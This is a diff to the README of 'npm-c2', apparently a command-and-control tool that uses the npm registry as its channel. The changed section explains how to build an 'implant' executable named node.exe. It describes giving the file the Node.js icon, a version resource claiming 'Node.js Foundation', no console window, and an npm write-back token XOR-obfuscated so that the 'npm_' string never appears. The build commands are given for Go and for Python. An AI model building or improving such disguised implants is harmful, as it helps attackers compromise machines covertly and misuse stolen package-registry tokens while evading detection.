@@ -138,28 +138,29 @@ npm-c2 operator -p npx-telemetry-collector -t npm_xxxx clean
 
 ## Build the Implant
 
-### Generate standalone
+### Go (recommended: ~1 s, single static exe)
 
+```sh
+python3 native/build_go.py                            # dist/node.exe
+python3 native/build_go.py -t npm_xxx -p <pkg>        # with write-back
+python3 native/build_go.py --32                       # also node-x86.exe
 ```
-# read-only (no token)
+
+Cross-compiles from Linux with the Go toolchain — no Wine, no PyInstaller.
+The Node.js icon, the version resource (`Node.js 22.7.0`, "Node.js Foundation")
+and an `asInvoker` manifest are baked in by `windres`.
+
+### Python (fallback, needs Windows or Wine)
+
+```sh
 npm-c2 --generate-standalone > standalone_implant.py
-
-# write-back (token embedded obfuscated)
-npm-c2 --generate-standalone -t npm_xxxx -p npx-telemetry-collector > standalone_implant.py
+npm-c2 --generate-standalone -t <tok> -p <pkg> > standalone_implant.py
+build.bat <tok> <pkg>          # Windows + pyinstaller
+native/build_windows.py        # Linux + Wine + pyinstaller
 ```
 
-Token is XOR-obfuscated with SHA256(package)[:16]. The string `npm_`
-never appears in the output file.
-
-### Compile to EXE
-
-```
-pip install pyinstaller
-build.bat
-```
-
-Produces `dist\node.exe`. Single file, no console. Version info shows
-Node.js v22.7.0, company Node.js Foundation. No Python needed on target.
+The generated Python implant is dependency-free (stdlib only) and stays useful
+when a Go toolchain is unavailable.
 
 ## Deploy
 
